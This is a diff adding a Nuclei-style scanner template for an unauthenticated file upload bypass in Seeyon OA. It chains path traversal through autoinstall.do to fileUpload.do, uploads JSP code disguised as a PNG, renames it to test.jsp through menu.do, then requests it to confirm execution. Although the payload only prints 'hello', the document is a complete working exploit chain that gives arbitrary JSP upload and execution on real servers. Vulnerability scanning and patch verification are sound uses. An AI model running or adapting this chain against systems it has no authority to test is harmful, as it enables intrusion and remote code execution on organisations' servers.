@@ -1,0 +1,93 @@
+id: seeyou-fileUpload-do-file-upload
+
+info:
+  name: 致远 OA fileUpload.do 前台文件上传绕过漏洞
+  author: g3m
+  severity: high
+
+http:
+  - raw:
+    - |
+      @timeout 25s
+      POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1
+      Host: {{Hostname}}
+      Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+      Content-Type: multipart/form-data; boundary=00content0boundary00
+      User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)
+
+      --00content0boundary00
+      Content-Disposition: form-data; name="type"
+
+
+      --00content0boundary00
+      Content-Disposition: form-data; name="extensions"
+
+      png
+      --00content0boundary00
+      Content-Disposition: form-data; name="applicationCategory"
+
+
+      --00content0boundary00
+      Content-Disposition: form-data; name="destDirectory"
+
+
+      --00content0boundary00
+      Content-Disposition: form-data; name="destFilename"
+
+
+      --00content0boundary00
+      Content-Disposition: form-data; name="maxSize"
+
+
+      --00content0boundary00
+      Content-Disposition: form-data; name="isEncrypt"
+
+      false
+      --00content0boundary00
+      Content-Disposition: form-data; name="test"; filename="test.png"
+      Content-Type: Content-Type: application/pdf
+
+      <% out.println("hello");%>
+      --00content0boundary00--
+
+
+    - |
+      @timeout 25s
+      POST /seeyon/autoinstall.do/../../seeyon/privilege/menu.do HTTP/1.1
+      Host: {{Hostname}}
+      Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+      Content-type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+
+      method=uploadMenuIcon&fileid={{FileResName}}&filename=test.jsp
+
+    - |
+      @timeout 25s
+      GET /seeyon/main/menuIcon/test.jsp HTTP/1.1
+      Host: {{Hostname}}
+      Upgrade-Insecure-Requests: 1
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.9
+
+
+    extractors: 
+      - type: regex
+        name: FileResName
+        part: body
+        internal: true
+        regex:
+        - "(\\-?\\d{15,})"
+        
+
+
+    matchers-condition: and
+    matchers: 
+      - type: word
+        words:
+          - "hello"
+        part: body
+      - type: status
+        status: 
+          - 200
